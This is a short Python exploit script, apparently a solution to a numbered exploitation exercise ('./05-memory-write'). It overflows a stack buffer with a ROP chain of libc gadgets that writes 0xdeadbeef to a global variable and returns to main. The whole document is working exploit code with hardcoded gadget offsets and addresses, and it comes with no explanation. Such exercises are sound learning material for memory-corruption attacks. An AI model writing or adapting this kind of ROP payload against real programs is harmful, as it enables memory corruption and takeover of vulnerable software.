#!/usr/bin/python

import struct

from zio import *

# 0x7ffff7a15000 /lib/x86_64-linux-gnu/libc-2.19.so
# 0x0000000000112ecf : pop rcx ; ret
# 0x0000000000001b8e : pop rdx ; ret
# 0x0000000000117fd8 : mov dword ptr [rcx], edx ; ret
# $1 = (int *) 0x601054 <x>

libc = 0x7ffff7a15000
rcx = libc + 0x0000000000112ecf
rdx = libc + 0x0000000000001b8e
mov = libc + 0x0000000000117fd8
x = 0x601054
main = 0x00000000004005eb

payload = 'a' * 128
payload += 'b' * 8
payload += struct.pack('<Q', rcx)
payload += struct.pack('<Q', x)
payload += struct.pack('<Q', rdx)
payload += struct.pack('<Q', 0xdeadbeef)
payload += struct.pack('<Q', mov)
payload += struct.pack('<Q', main)

io = zio("./05-memory-write")
io.write(payload)
io.interact()
